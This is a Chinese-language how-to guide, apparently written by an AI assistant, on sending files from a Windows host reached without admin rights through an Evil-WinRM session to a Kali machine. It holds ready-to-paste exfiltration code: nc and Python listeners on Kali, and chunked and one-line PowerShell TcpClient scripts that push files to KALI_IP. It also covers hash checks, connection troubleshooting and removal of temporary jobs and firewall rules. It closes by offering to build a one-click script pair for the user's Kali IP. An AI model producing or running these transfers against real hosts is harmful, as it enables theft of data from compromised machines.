# Windows → Kali 文件传输（实用指南）

说明：本指南汇总了在 **无管理员权限**、已建立远程会话（例如 Evil‑WinRM）的 Windows 主机上，把文件**发送到 Kali** 的常用可靠方法。每个方法包含**Kali 端（接收）**与**Windows 端（发送）**的可复制命令、完整性校验、常见故障与清理步骤。

> 先决：**接收端（Kali）必须先启动监听**，否则发送端连接会失败。

---

## 方案 A（推荐）——nc（Kali 监听） + PowerShell 分块发送（二进制安全、内存友好）

### Kali（先）
```bash
# 在 Kali：进入接收目录并监听端口 1234
cd /tmp
# 传统 nc: nc -l -p 1234 > received_myfile.txt
# OpenBSD nc: nc -l 1234 > received_myfile.txt
nc -l -p 1234 > received_myfile.txt
```

- 保持该终端打开直到传输完成。

### Windows（后，PowerShell 分块发送）
```powershell
$KaliIP = 'KALI_IP'        # 替换为你的 Kali IP
$KaliPort = 1234
$FilePath = '.\myfile.txt' # 要发送的文件

$fs = [System.IO.File]::OpenRead($FilePath)
$client = New-Object System.Net.Sockets.TcpClient($KaliIP,$KaliPort)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65536   # 64KB 缓冲
try {
  while (($read = $fs.Read($buffer,0,$buffer.Length)) -gt 0) {
    $stream.Write($buffer,0,$read)
  }
} finally {
  $fs.Close()
  $stream.Close()
  $client.Close()
}
```

### 验证完整性
**Windows（发送前）**：
```powershell
certutil -hashfile .\myfile.txt SHA256
```

**Kali（接收后）**：
```bash
sha256sum received_myfile.txt
```

两侧哈希一致则传输无损。

---

## 方案 B（备用）——Kali 用 Python 接收（若无 nc）

### Kali（先）
```bash
python3 - <<'PY'
import socket
s=socket.socket()
s.bind(('0.0.0.0',1234))
s.listen(1)
conn,addr=s.accept()
with open('received_myfile.txt','wb') as f:
    while True:
        data=conn.recv(65536)
        if not data:
            break
        f.write(data)
conn.close()
s.close()
PY
```

### Windows（后）
使用与方案 A 相同的 PowerShell 分块脚本（把 `KALI_IP` 改为 Kali 地址）。

---

## 方案 C（短命令 — 小文件）

**注意：** 这个方法会一次性把整个文件读进内存，不适合大文件。

### Kali（先）
```bash
nc -l -p 1234 > received_myfile.txt
```

### Windows（后，一行发送）
```powershell
$bytes=[System.IO.File]::ReadAllBytes('.\myfile.txt'); $c=New-Object System.Net.Sockets.TcpClient('KALI_IP',1234); $s=$c.GetStream(); $s.Write($bytes,0,$bytes.Length); $s.Close(); $c.Close()
```

---

## 方案 D（当出站被严格限制）——通过 HTTP 上传到 Kali（需 Kali 提供接收接口）

- 复杂但可行：在 Kali 用 Flask/HTTP 接收 POST/PUT，Windows 用 `Invoke-RestMethod` / `curl --upload-file` 上传。
- 若需要，我可生成 Flask 接收端与 Windows 上传命令。

---

## 额外：在 Windows 启临时 HTTP（反向选择）
如果你能在 Windows 启动 server（例如 Python 正常可用或用 PowerShell HttpListener），Kali 可直接 `wget` 拉取。示例（PowerShell HttpListener 后台启动）：

```powershell
# 后台启动示例（端口 8080）
$script = { ... Start-Job 脚本 ... }
Start-Job -ScriptBlock $script -Name PsHttp8000
```

（详见主教程中 PowerShell HttpListener 示例）

---

## 常见故障与排查

- **连接被拒绝 / 无法连接到 Kali:1234**
  - 确认 Kali 的监听命令已先启动：`ss -lntp | grep 1234` / `netstat -an | grep 1234`。
  - 如 Kali 在 NAT/云环境，确认路由/防火墙/安全组允许来自目标的入站。
  - 在 Windows 测试连通性：
    ```powershell
    Test-NetConnection -ComputerName KALI_IP -Port 1234
    ```

- **传输结束文件为空或传输失败**
  - 常因 Kali 未先监听或发送脚本早退。务必先启动 Kali 监听。

- **内存不足（OutOfMemory）**
  - 禁止使用一次性 `ReadAllBytes`（除非文件非常小）。改用分块读取脚本。

- **中文/编码显示乱码**
  - 二进制传输不会改变字节，但 Windows 文件可能为 UTF-16LE（带 BOM）。在 Kali 上转换：
    ```bash
    iconv -f utf-16le -t utf-8 received_myfile.txt > received_myfile.utf8.txt
    ```

---

## 清理建议
- 传输后如不再需要接收端文件请删除：
```bash
rm /tmp/received_myfile.txt
```
- 若在 Windows 临时启动了 server 或创建了防火墙规则，请停止后台 job 并删除规则：
```powershell
Stop-Job -Name PsHttp8000; Remove-Job -Name PsHttp8000
Get-NetFirewallRule -DisplayName 'TEMP-Allow-HTTP-8000' | Remove-NetFirewallRule
```

---

## 附录：事务流程速查（最短步骤）
1. 在 Kali：`nc -l -p 1234 > received_myfile.txt`
2. 在 Windows（PowerShell）：粘入并执行分块发送脚本（替 `KALI_IP`）
3. 在 Kali：`sha256sum received_myfile.txt`，在 Windows：`certutil -hashfile .\myfile.txt SHA256`，比对哈希

---

如需我把上面文档调整成更短的 Cheat‑sheet，或生成包含你 Kali IP 的“可直接粘贴”一键脚本对（Kali 启动命令 + Windows 发送脚本），把你的 Kali IP 发给我，我立即生成。

